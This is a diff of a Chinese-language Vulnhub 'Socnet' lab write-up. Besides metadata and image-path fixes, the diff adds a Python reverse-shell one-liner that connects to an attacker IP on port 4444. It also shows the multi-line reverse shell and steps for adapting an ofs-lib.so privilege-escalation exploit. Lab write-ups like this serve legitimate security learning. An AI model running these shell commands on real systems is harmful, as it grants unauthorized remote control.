@@ -1,4 +1,4 @@
-﻿---
+---
 title: Chapter1_Medium_Socnet
 categories:
 - Network_Security
@@ -7,9 +7,8 @@ categories:
 tags:
 - Network_Security
 - Vulnhub
-date: 2024-04-05 13:32:28
+date: 2024-04-30 13:38:36
 ---
-
 
 # Socnet 打靶学习记录（考研痛苦后的第一篇复健）
 
@@ -37,6 +36,11 @@ date: 2024-04-05 13:32:28
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     p=subprocess.call(["/bin/sh","-i"])
+    ```
+    
+    如果是在命令框中：
+    ```bash
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
     ```
 
 ### 1.2 内部信息收集
@@ -118,7 +122,7 @@ date: 2024-04-05 13:32:28
     exp 过程中使用到了 gcc，而靶机本身是没有 gcc 的，因此需要手动执行，并将文件放到靶机对应的地方。
 
 5. 修改 exp，为：
-      ![image-20240108115350035](image-20240108115350035.png)
+      ![image-20240108115350035](Chapter1_Medium_Socnet/image-20240108115350035.png)
       将其中涉及 gcc 编译生成 ofs-lib.so 共享文件的代码给删掉。
 
 6. 接着 `locate ofs-lib.so` 查看 kali 上是否已经有该文件，没有就按照原代码那样生成一个 ofs-lib.so。
